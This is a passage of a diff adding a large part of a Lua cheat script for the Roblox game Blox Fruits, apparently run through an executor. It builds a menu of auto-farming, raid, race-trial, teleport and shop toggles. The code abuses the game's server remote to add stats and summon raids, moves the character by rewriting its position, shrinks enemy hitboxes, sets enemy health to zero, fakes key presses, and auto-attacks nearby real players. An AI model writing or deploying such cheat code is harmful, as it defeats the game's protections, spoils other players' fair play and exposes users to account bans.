+                elseif (game:GetService("ReplicatedStorage")):FindFirstChild("Soul Reaper") then
+                    TweenPlayer(((game:GetService("ReplicatedStorage")):FindFirstChild("Soul Reaper")).HumanoidRootPart
+                                    .CFrame * CFrame.new(2, 20, 2));
+                end
+            end);
+        end
+    end
+end);
+StatsSection = Tabs.StatsTab:Section({
+    Title = "Stats",
+    TextXAlignment = "Left"
+});
+StatsPointParagraph = Tabs.StatsTab:Paragraph({
+    Title = "Stats",
+    Desc = "0"
+});
+spawn(function()
+    while wait(0.2) do
+        pcall(function()
+            StatsPointParagraph:SetDesc(tostring((game:GetService("Players")).LocalPlayer.Data.Points.Value));
+        end);
+    end
+end);
+AutoAddMeleeStats = Tabs.StatsTab:Toggle({
+    Title = "Add Melee Stats",
+    Value = _G.Settings.Stats["Auto Add Melee Stats"],
+    Callback = function(state)
+        _G.Settings.Stats["Auto Add Melee Stats"] = state;
+    end
+});
+AutoAddDefenseStats = Tabs.StatsTab:Toggle({
+    Title = "Add Defense Stats",
+    Value = _G.Settings.Stats["Auto Add Defense Stats"],
+    Callback = function(state)
+        _G.Settings.Stats["Auto Add Defense Stats"] = state;
+    end
+});
+AutoAddSwordStats = Tabs.StatsTab:Toggle({
+    Title = "Add Sword Stats",
+    Value = _G.Settings.Stats["Auto Add Sword Stats"],
+    Callback = function(state)
+        _G.Settings.Stats["Auto Add Sword Stats"] = state;
+    end
+});
+AutoAddGunStats = Tabs.StatsTab:Toggle({
+    Title = "Add Gun Stats",
+    Value = _G.Settings.Stats["Auto Add Gun Stats"],
+    Callback = function(state)
+        _G.Settings.Stats["Auto Add Gun Stats"] = state;
+    end
+});
+AutoAddDevilFruitStats = Tabs.StatsTab:Toggle({
+    Title = "Add Devil Fruit Stats",
+    Value = _G.Settings.Stats["Auto Add Devil Fruit Stats"],
+    Callback = function(state)
+        _G.Settings.Stats["Auto Add Devil Fruit Stats"] = state;
+    end
+});
+PointStats = 1;
+StatsPointToAddSlider = Tabs.StatsTab:Slider({
+    Title = "Point",
+    Step = 1,
+    Value = {
+        Min = 1,
+        Max = 100,
+        Default = PointStats
+    },
+    Callback = function(value)
+        PointStats = value;
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        if game.Players.localPlayer.Data.Points.Value >= PointStats then
+            if _G.Settings.Stats["Auto Add Melee Stats"] then
+                local args = {
+                    [1] = "AddPoint",
+                    [2] = "Melee",
+                    [3] = PointStats
+                };
+                (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer(unpack(args));
+            end
+            if _G.Settings.Stats["Auto Add Defense Stats"] then
+                local args = {
+                    [1] = "AddPoint",
+                    [2] = "Defense",
+                    [3] = PointStats
+                };
+                (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer(unpack(args));
+            end
+            if _G.Settings.Stats["Auto Add Sword Stats"] then
+                local args = {
+                    [1] = "AddPoint",
+                    [2] = "Sword",
+                    [3] = PointStats
+                };
+                (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer(unpack(args));
+            end
+            if _G.Settings.Stats["Auto Add Gun Stats"] then
+                local args = {
+                    [1] = "AddPoint",
+                    [2] = "Gun",
+                    [3] = PointStats
+                };
+                (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer(unpack(args));
+            end
+            if _G.Settings.Stats["Auto Add Devil Fruit Stats"] then
+                local args = {
+                    [1] = "AddPoint",
+                    [2] = "Demon Fruit",
+                    [3] = PointStats
+                };
+                (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer(unpack(args));
+            end
+        end
+    end
+end);
+RaidSection = Tabs.RaidTab:Section({
+    Title = "Raid",
+    TextXAlignment = "Left"
+});
+TimeRaidParagraph = Tabs.RaidTab:Paragraph({
+    Title = "Raid Time",
+    Desc = "N/A"
+});
+IslandRaidParagraph = Tabs.RaidTab:Paragraph({
+    Title = "Island",
+    Desc = "N/A"
+});
+spawn(function()
+    pcall(function()
+        while wait(0.2) do
+            if (game:GetService("Players")).LocalPlayer.PlayerGui.Main.TopHUDList.RaidTimer.Visible == true then
+                TimeRaidParagraph:SetDesc((game:GetService("Players")).LocalPlayer.PlayerGui.Main.TopHUDList.RaidTimer
+                                              .Text);
+            else
+                TimeRaidParagraph:SetDesc("Wait For Dungeon");
+            end
+        end
+    end);
+end);
+spawn(function()
+    pcall(function()
+        while wait(0.2) do
+            if game.Workspace.Map.RaidMap:FindFirstChild("RaidIsland5") then
+                IslandRaidParagraph:SetDesc("ðŸï¸ Island 5");
+            elseif game.Workspace.Map.RaidMap:FindFirstChild("RaidIsland4") then
+                IslandRaidParagraph:SetDesc("ðŸï¸ Island 4");
+            elseif game.Workspace.Map.RaidMap:FindFirstChild("RaidIsland3") then
+                IslandRaidParagraph:SetDesc("ðŸï¸ Island 3");
+            elseif game.Workspace.Map.RaidMap:FindFirstChild("RaidIsland2") then
+                IslandRaidParagraph:SetDesc("ðŸï¸ Island 2");
+            elseif game.Workspace.Map.RaidMap:FindFirstChild("RaidIsland1") then
+                IslandRaidParagraph:SetDesc("ðŸï¸ Island 1");
+            else
+                IslandRaidParagraph:SetDesc("Start Dungeon");
+            end
+        end
+    end);
+end);
+function NextRaidIsland()
+    local RaidPos = CFrame.new(0, 35, 0);
+    if (game:GetService("Players")).LocalPlayer.PlayerGui.Main.TopHUDList.RaidTimer.Visible == true then
+        if (game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 5") then
+            TweenPlayer(((game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 5")).CFrame *
+                            RaidPos);
+        elseif (game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 4") then
+            TweenPlayer(((game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 4")).CFrame *
+                            RaidPos);
+        elseif (game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 3") then
+            TweenPlayer(((game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 3")).CFrame *
+                            RaidPos);
+        elseif (game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 2") then
+            TweenPlayer(((game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 2")).CFrame *
+                            RaidPos);
+        elseif (game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 1") then
+            TweenPlayer(((game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 1")).CFrame *
+                            RaidPos);
+        end
+    end
+end
+function CheckMonRaids()
+    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+        if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 300 then
+            return true;
+        else
+            return false;
+        end
+    end
+end
+spawn(function()
+    pcall(function()
+        while wait(0.2) do
+            if _G.Settings.Raid["Auto Raid"] and (World2 or World3) then
+                if (game:GetService("Players")).LocalPlayer.PlayerGui.Main.TopHUDList.RaidTimer.Visible == true then
+                    if CheckMonRaids() then
+                        for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
+                                v.Humanoid.Health > 0 then
+                                if (v.HumanoidRootPart.Position -
+                                    game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 500 then
+                                    pcall(function()
+                                        repeat
+                                            wait();
+                                            Attack();
+                                            EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                            TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                            AutoHaki();
+                                            v.Humanoid.WalkSpeed = 0;
+                                            v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                        until not _G.Settings.Raid["Auto Raid"] or (not v.Parent) or v.Humanoid.Health <=
+                                            0;
+                                    end);
+                                end
+                            end
+                        end
+                    else
+                        NextRaidIsland();
+                    end
+                end
+            end
+        end
+    end);
+end);
+spawn(function()
+    while wait(0.2) do
+        pcall(function()
+            if _G.Settings.Raid["Auto Raid"] and (World2 or World3) then
+                if (game:GetService("Players")).LocalPlayer.PlayerGui.Main.TopHUDList.RaidTimer.Visible == false then
+                    if not game.Workspace.Map.RaidMap:FindFirstChild("RaidIsland1") and
+                        (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Special Microchip") or
+                        (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Special Microchip") then
+                        if World2 then
+                            fireclickdetector((game:GetService("Workspace")).Map.CircleIsland.RaidSummon2.Button.Main
+                                                  .ClickDetector);
+                        elseif World3 then
+                            (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("requestEntrance",
+                                Vector3.new(-5083.26025390625, 314.6056823730469, -3175.673095703125));
+                            fireclickdetector((game:GetService("Workspace")).Map["Boat Castle"].RaidSummon2.Button.Main
+                                                  .ClickDetector);
+                        end
+                    end
+                end
+            end
+        end);
+    end
+end);
+Raidslist = {};
+RaidsModule = require(game.ReplicatedStorage.Raids);
+for i, v in pairs(RaidsModule.raids) do
+    table.insert(Raidslist, v);
+end
+for i, v in pairs(RaidsModule.advancedRaids) do
+    table.insert(Raidslist, v);
+end
+ChooseChipRaidDropdown = Tabs.RaidTab:Dropdown({
+    Title = "Choose Chip",
+    Values = Raidslist,
+    Value = _G.Settings.Raid["Selected Chip"],
+    Callback = function(option)
+        _G.Settings.Raid["Selected Chip"] = option;
+    end
+});
+spawn(function()
+    pcall(function()
+        while wait(0.2) do
+            if _G.Settings.Raid["Auto Raid"] and (World2 or World3) then
+                if not (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Special Microchip") or
+                    (not (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Special Microchip")) then
+                    if not (game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Island 1") then
+                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("RaidsNpc", "Select",
+                            _G.Settings.Raid["Selected Chip"]);
+                    end
+                end
+            end
+        end
+    end);
+end);
+AutoRaidToggle = Tabs.RaidTab:Toggle({
+    Title = "Auto Raid",
+    Desc = "Complete automatically",
+    Value = _G.Settings.Raid["Auto Raid"],
+    Callback = function(state)
+        _G.Settings.Raid["Auto Raid"] = state;
+        StopTween(_G.Settings.Raid["Auto Raid"]);
+        (getgenv()).SaveSetting();
+    end
+});
+AutoAwakeningToggle = Tabs.RaidTab:Toggle({
+    Title = "Auto Awaken",
+    Value = _G.Settings.Raid["Auto Awaken"],
+    Callback = function(state)
+        _G.Settings.Raid["Auto Awaken"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Raid["Auto Awaken"] then
+            pcall(function()
+                (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("Awakener", "Awaken");
+            end);
+        end
+    end
+end);
+PriceDevilFruitToUnstoreSlider = Tabs.RaidTab:Slider({
+    Title = "Price",
+    Value = {
+        Min = 1,
+        Max = 10000000,
+        Default = _G.Settings.Raid["Price Devil Fruit"]
+    },
+    Callback = function(value)
+        _G.Settings.Raid["Price Devil Fruit"] = value;
+        (getgenv()).SaveSetting();
+    end
+});
+AutoUnstoreDevilFruitToggle = Tabs.RaidTab:Toggle({
+    Title = "Auto Unstore Devil Fruit",
+    Value = _G.Settings.Raid["Unstore Devil Fruit"],
+    Callback = function(state)
+        _G.Settings.Raid["Unstore Devil Fruit"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+function GetFruitsInfo()
+    for i, v in pairs((game:GetService("Players")).LocalPlayer.Backpack:GetChildren()) do
+        if string.find(v.Name, "Fruit") then
+            return true;
+        end
+    end
+    for i, v in pairs((game:GetService("Players")).LocalPlayer.Character:GetChildren()) do
+        if string.find(v.Name, "Fruit") then
+            return true;
+        end
+    end
+    return false;
+end
+spawn(function()
+    while wait(0.2) do
+        pcall(function()
+            if _G.Settings.Raid["Unstore Devil Fruit"] then
+                fruit = (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("getInventoryFruits");
+                for i, v in pairs(fruit) do
+                    if v.Price < _G.Settings.Raid["Price Devil Fruit"] then
+                        if not GetFruitsInfo() then
+                            (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("LoadFruit", v.Name);
+                        end
+                    end
+                end
+            end
+        end);
+    end
+end);
+TeleportTolabButton = Tabs.RaidTab:Button({
+    Title = "Teleport To Lab",
+    Callback = function()
+        if World2 then
+            TweenPlayer(CFrame.new(-6438.73535, 250.645355, -4501.50684));
+        elseif World3 then
+            TweenPlayer(CFrame.new(-5017.40869, 314.844055, -2823.0127, -0.925743818, 0.0000000448217499, -0.378151238,
+                0.00000000455503146, 1, 0.000000107377559, 0.378151238, 0.000000097681621, -0.925743818));
+        end
+    end
+});
+LawRaidSection = Tabs.RaidTab:Section({
+    Title = "Law Raid",
+    TextXAlignment = "Left"
+});
+AutoLawRaidToggle = Tabs.RaidTab:Toggle({
+    Title = "Auto Law Raid",
+    Value = _G.Settings.Raid["Law Raid"],
+    Callback = function(state)
+        _G.Settings.Raid["Law Raid"] = value;
+        StopTween(_G.Settings.Raid["Law Raid"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    pcall(function()
+        while wait(0.2) do
+            if _G.Settings.Raid["Law Raid"] then
+                if not (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Microchip") and
+                    (not (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Microchip")) and
+                    (not (game:GetService("Workspace")).Enemies:FindFirstChild("Order")) and
+                    (not (game:GetService("ReplicatedStorage")):FindFirstChild("Order")) then
+                    wait(0.3);
+                    (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BlackbeardReward", "Microchip",
+                        "1");
+                    (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BlackbeardReward", "Microchip",
+                        "2");
+                end
+            end
+        end
+    end);
+end);
+spawn(function()
+    pcall(function()
+        while wait(0.2) do
+            if _G.Settings.Raid["Law Raid"] then
+                if not (game:GetService("Workspace")).Enemies:FindFirstChild("Order") and
+                    (not (game:GetService("ReplicatedStorage")):FindFirstChild("Order")) then
+                    if (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Microchip") or
+                        (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Microchip") then
+                        fireclickdetector((game:GetService("Workspace")).Map.CircleIsland.RaidSummon.Button.Main
+                                              .ClickDetector);
+                    end
+                end
+                if (game:GetService("ReplicatedStorage")):FindFirstChild("Order") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Order") then
+                    if (game:GetService("Workspace")).Enemies:FindFirstChild("Order") then
+                        for h, i in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                            if i.Name == "Order" then
+                                repeat
+                                    (game:GetService("RunService")).Heartbeat:wait();
+                                    Attack();
+                                    AutoHaki();
+                                    EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                    TweenPlayer(i.HumanoidRootPart.CFrame * Pos);
+                                    i.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                    Attack();
+                                until not i.Parent or i.Humanoid.Health <= 0 or _G.Settings.Raid["Law Raid"] == false;
+                            end
+                        end
+                    elseif (game:GetService("ReplicatedStorage")):FindFirstChild("Order") then
+                        TweenPlayer(CFrame.new(-6217.2021484375, 28.047645568848, -5053.1357421875));
+                    end
+                end
+            end
+        end
+    end);
+end);
+RaceTabSection = Tabs.RaceTab:Section({
+    Title = "Race",
+    TextXAlignment = "Left"
+});
+local PlaceV4List = {"Top Of GreatTree", "Timple Of Time", "Lever Pull", "Acient One"};
+SelectedPlaceDropdown = Tabs.RaceTab:Dropdown({
+    Title = "Selected Place",
+    Values = PlaceV4List,
+    Value = _G.Settings.Race["Selected Place"],
+    Callback = function(value)
+        _G.Settings.Race["Selected Place"] = value;
+        (getgenv()).SaveSetting();
+    end
+});
+TeleportToPlaceToggle = Tabs.RaceTab:Toggle({
+    Title = "Teleport To Place",
+    Value = _G.Settings.Race["Teleport To Place"],
+    Callback = function(state)
+        _G.Settings.Race["Teleport To Place"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Race["Teleport To Place"] then
+            pcall(function()
+                if _G.Settings.Race["Selected Place"] == "Top Of GreatTree" then
+                    TweenPlayer(CFrame.new(2947.556884765625, 2281.630615234375, -7213.54931640625));
+                elseif _G.Settings.Race["Selected Place"] == "Timple Of Time" then
+                    (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(
+                        28286.35546875, 14895.3017578125, 102.62469482421875);
+                elseif _G.Settings.Race["Selected Place"] == "Lever Pull" then
+                    local LeverPullPos = CFrame.new(28575.181640625, 14936.6279296875, 72.31636810302734);
+                    if (LeverPullPos.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude >=
+                        1000 then
+                        (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(
+                            28286.35546875, 14895.3017578125, 102.62469482421875);
+                    else
+                        TweenPlayer(LeverPullPos);
+                    end
+                elseif _G.Settings.Race["Selected Place"] == "Acient One" then
+                    TweenPlayer(CFrame.new(28981.552734375, 14888.4267578125, -120.245849609375));
+                end
+            end);
+        end
+    end
+end);
+AutoBuyGearToggle = Tabs.RaceTab:Toggle({
+    Title = "Auto Buy Gear",
+    Value = _G.Settings.Race["Auto Buy Gear"],
+    Callback = function(state)
+        _G.Settings.Race["Auto Buy Gear"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    pcall(function()
+        while wait(0.2) do
+            if _G.Settings.Race["Auto Buy Gear"] then
+                local args = {
+                    [1] = true
+                };
+                local args = {
+                    [1] = "UpgradeRace",
+                    [2] = "Buy"
+                };
+                (((game:GetService("ReplicatedStorage")):WaitForChild("Remotes")):WaitForChild("CommF_")):InvokeServer(
+                    unpack(args));
+            end
+        end
+    end);
+end);
+TweenToMirageIslandToggle = Tabs.RaceTab:Toggle({
+    Title = "Tween To Mirage Island",
+    Desc = "Tween to highest point",
+    Value = _G.Settings.Race["Tween To Highest Mirage"],
+    Callback = function(state)
+        _G.Settings.Race["Tween To Highest Mirage"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+FindBlueGearToggle = Tabs.RaceTab:Toggle({
+    Title = "Find Blue Gear",
+    Value = _G.Settings.Race["Find Blue Gear"],
+    Callback = function(state)
+        _G.Settings.Race["Find Blue Gear"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    pcall(function()
+        while wait(0.2) do
+            if _G.Settings.Race["Find Blue Gear"] then
+                if (game:GetService("Workspace")).Map:FindFirstChild("MysticIsland") then
+                    for i, v in pairs((game:GetService("Workspace")).Map.MysticIsland:GetChildren()) do
+                        if v:IsA("MeshPart") then
+                            if v.Material == Enum.Material.Neon then
+                                TweenPlayer(v.CFrame);
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end);
+end);
+LookMoonAbilityToggle = Tabs.RaceTab:Toggle({
+    Title = "Look Moon & use Ability",
+    Value = _G.Settings.Race["Look Moon Ability"],
+    Callback = function(state)
+        _G.Settings.Race["Look Moon Ability"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        pcall(function()
+            if _G.Settings.Race["Look Moon Ability"] then
+                wait();
+                local moonDir = game.Lighting:GetMoonDirection();
+                local lookAtPos = game.Workspace.CurrentCamera.CFrame.p + moonDir * 100;
+                game.Workspace.CurrentCamera.CFrame = CFrame.lookAt(game.Workspace.CurrentCamera.CFrame.p, lookAtPos);
+            end
+        end);
+    end
+end);
+AutoTrainToggle = Tabs.RaceTab:Toggle({
+    Title = "Auto Train",
+    Value = _G.Settings.Race["Auto Train"],
+    Callback = function(state)
+        _G.Settings.Race["Auto Train"] = state;
+        StopTween(_G.Settings.Race["Auto Train"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    pcall(function()
+        while wait(0.2) do
+            if _G.Settings.Race["Auto Train"] then
+                if game.Players.LocalPlayer.Character.RaceTransformed.Value == true then
+                    StartFarmTrain = false;
+                    TweenPlayer(CFrame.new(216.211181640625, 126.9352035522461, -12599.0732421875));
+                end
+            end
+        end
+    end);
+end);
+spawn(function()
+    while wait(0.2) do
+        if StartFarmTrain and World3 then
+            pcall(function()
+                if (game:GetService("Workspace")).Enemies:FindFirstChild("Cocoa Warrior") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Chocolate Bar Battler") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Sweet Thief") or
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Candy Rebel") then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if v.Name == "Cocoa Warrior" or v.Name == "Chocolate Bar Battler" or v.Name == "Sweet Thief" or
+                            v.Name == "Candy Rebel" then
+                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
+                                v.Humanoid.Health > 0 then
+                                repeat
+                                    (game:GetService("RunService")).Heartbeat:wait();
+                                    AutoHaki();
+                                    EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                    v.Humanoid.WalkSpeed = 0;
+                                    PosMon = v.HumanoidRootPart.CFrame;
+                                    MonFarm = v.Name;
+                                    TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                    Attack();
+                                until not StartFarmTrain or (not v.Parent) or v.Humanoid.Health <= 0;
+                            end
+                        end
+                    end
+                else
+                    TweenPlayer(CFrame.new(216.211181640625, 126.9352035522461, -12599.0732421875));
+                end
+            end);
+        end
+    end
+end);
+spawn(function()
+    pcall(function()
+        while wait(0.2) do
+            if _G.Settings.Race["Auto Train"] then
+                if game.Players.LocalPlayer.Character.RaceTransformed.Value == false then
+                    StartFarmTrain = true;
+                end
+            end
+        end
+    end);
+end);
+spawn(function()
+    while wait(0.2) do
+        pcall(function()
+            if _G.Settings.Race["Auto Train"] then
+                if tonumber(((game:GetService("Players")).LocalPlayer.Character:WaitForChild("RaceEnergy")).Value) == 1 then
+                    if (game:GetService("Players")).LocalPlayer.Character.RaceTransformed.Value == false then
+                        (game:GetService("VirtualInputManager")):SendKeyEvent(true, "Y", false, game);
+                        wait(0.1);
+                        (game:GetService("VirtualInputManager")):SendKeyEvent(false, "Y", false, game);
+                    end
+                end
+            end
+        end);
+    end
+end);
+TeleportToRaceDoorButton = Tabs.RaceTab:Button({
+    Title = "Teleport To Race Door",
+    Callback = function()
+        (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(28286.35546875,
+            14895.3017578125, 102.62469482421875);
+        wait(0.1);
+        (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(28286.35546875,
+            14895.3017578125, 102.62469482421875);
+        wait(0.1);
+        (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(28286.35546875,
+            14895.3017578125, 102.62469482421875);
+        wait(0.1);
+        (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(28286.35546875,
+            14895.3017578125, 102.62469482421875);
+        wait(0.5);
+        if (game:GetService("Players")).LocalPlayer.Data.Race.Value == "Human" then
+            TweenPlayer(CFrame.new(29221.822265625, 14890.9755859375, -205.99114990234375));
+        elseif (game:GetService("Players")).LocalPlayer.Data.Race.Value == "Skypiea" then
+            TweenPlayer(CFrame.new(28960.158203125, 14919.6240234375, 235.03948974609375));
+        elseif (game:GetService("Players")).LocalPlayer.Data.Race.Value == "Fishman" then
+            TweenPlayer(CFrame.new(28231.17578125, 14890.9755859375, -211.64173889160156));
+        elseif (game:GetService("Players")).LocalPlayer.Data.Race.Value == "Cyborg" then
+            TweenPlayer(CFrame.new(28502.681640625, 14895.9755859375, -423.7279357910156));
+        elseif (game:GetService("Players")).LocalPlayer.Data.Race.Value == "Ghoul" then
+            TweenPlayer(CFrame.new(28674.244140625, 14890.6767578125, 445.4310607910156));
+        elseif (game:GetService("Players")).LocalPlayer.Data.Race.Value == "Mink" then
+            TweenPlayer(CFrame.new(29012.341796875, 14890.9755859375, -380.1492614746094));
+        end
+    end
+});
+BuyAcientQuestButton = Tabs.RaceTab:Button({
+    Title = "Buy Acient Quest",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("UpgradeRace", "Buy");
+    end
+});
+AutoTrialToggle = Tabs.RaceTab:Toggle({
+    Title = "Auto Trial",
+    Value = _G.Settings.Race["Auto Trial"],
+    Callback = function(value)
+        _G.Settings.Race["Auto Trial"] = value;
+        StopTween(_G.Settings.Race["Auto Trial"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    pcall(function()
+        while wait(0.2) do
+            if _G.Settings.Race["Auto Trial"] then
+                if (game:GetService("Players")).LocalPlayer.Data.Race.Value == "Human" then
+                    for i, v in pairs(game.Workspace.Enemies:GetDescendants()) do
+                        if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health >
+                            0 then
+                            pcall(function()
+                                repeat
+                                    wait(0.1);
+                                    v.Humanoid.Health = 0;
+                                until not _G.Settings.Race["Auto Trial"] or (not v.Parent) or v.Humanoid.Health <= 0;
+                            end);
+                        end
+                    end
+                elseif (game:GetService("Players")).LocalPlayer.Data.Race.Value == "Skypiea" then
+                    for i, v in pairs((game:GetService("Workspace")).Map.SkyTrial.Model:GetDescendants()) do
+                        if v.Name == "snowisland_Cylinder.081" then
+                            TweenPlayer(v.CFrame * CFrame.new(0, 0, 0));
+                        end
+                    end
+                elseif (game:GetService("Players")).LocalPlayer.Data.Race.Value == "Fishman" then
+                    for i, v in pairs((game:GetService("Workspace")).SeaBeasts.SeaBeast1:GetDescendants()) do
+                        if v.Name == "HumanoidRootPart" then
+                            repeat
+                                wait();
+                                TweenPlayer(v.CFrame * CFrame.new(0, 200, 0));
+                                useAllSkill();
+                            until not _G.Settings.Race["Auto Trial"] or (not v.Parent) or v.Humanoid.Health <= 0 or
+                                (not v:FindFirstChild("HumanoidRootPart"));
+                        end
+                    end
+                elseif (game:GetService("Players")).LocalPlayer.Data.Race.Value == "Cyborg" then
+                    TweenPlayer(CFrame.new(28654, 14898.7832, -30, 1, 0, 0, 0, 1, 0, 0, 0, 1));
+                elseif (game:GetService("Players")).LocalPlayer.Data.Race.Value == "Ghoul" then
+                    for i, v in pairs(game.Workspace.Enemies:GetDescendants()) do
+                        if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health >
+                            0 then
+                            pcall(function()
+                                repeat
+                                    wait(0.1);
+                                    v.Humanoid.Health = 0;
+                                until not _G.Settings.Race["Auto Trial"] or (not v.Parent) or v.Humanoid.Health <= 0;
+                            end);
+                        end
+                    end
+                elseif (game:GetService("Players")).LocalPlayer.Data.Race.Value == "Mink" then
+                    for i, v in pairs((game:GetService("Workspace")):GetDescendants()) do
+                        if v.Name == "StartPoint" then
+                            TweenPlayer(v.CFrame * CFrame.new(0, 10, 0));
+                        end
+                    end
+                end
+            end
+        end
+    end);
+end);
+AutoKillPlayerAfterTrialToggle = Tabs.RaceTab:Toggle({
+    Title = "Auto Kill Player After Trial",
+    Value = _G.Settings.Race["Auto Kill Player After Trial"],
+    Callback = function(value)
+        _G.Settings.Race["Auto Kill Player After Trial"] = value;
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.Race["Auto Kill Player After Trial"] then
+            if (game:GetService("Players")).LocalPlayer.PlayerGui.Main.TopHUDList.Timer.Visible == true then
+                for i, v in pairs((game:GetService("Players")):GetPlayers()) do
+                    if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
+                        if (v.Character.HumanoidRootPart.Position -
+                            game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 500 then
+                            if v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health > 0 then
+                                repeat
+                                    (game:GetService("RunService")).Heartbeat:Wait();
+                                    EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                    AutoHaki();
+                                    TweenPlayer(v.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 40));
+                                    Attack();
+                                until not _G.Settings.Race["Auto Kill Player After Trial"] or (not v.Character) or
+                                    v.Character.Humanoid.Health <= 0;
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+end);
+TeleportSection = Tabs.TeleportTab:Section({
+    Title = "Teleport",
+    TextXAlignment = "Left"
+});
+TeleportToFirstSeaButton = Tabs.TeleportTab:Button({
+    Title = "Teleport To First Sea",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("TravelMain");
+    end
+});
+TeleportToSecondSeaButton = Tabs.TeleportTab:Button({
+    Title = "Teleport To Second Sea",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("TravelDressrosa");
+    end
+});
+TeleportToThirdSeaButton = Tabs.TeleportTab:Button({
+    Title = "Teleport To Third Sea",
+    Callback = function()
+        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("TravelZou");
+    end
+});
+TeleportIslandSection = Tabs.TeleportTab:Section({
+    Title = "Island",
+    TextXAlignment = "Left"
+});
+ShopSection = Tabs.ShopTab:Section({
+    Title = "Shop",
+    TextXAlignment = "Left"
+});
+AutoBuyLegendarySwordToggle = Tabs.ShopTab:Toggle({
+    Title = "Auto Buy Legendary Sword",
+    Value = _G.Settings.Shop["Auto Buy Legendary Sword"],
+    Callback = function(state)
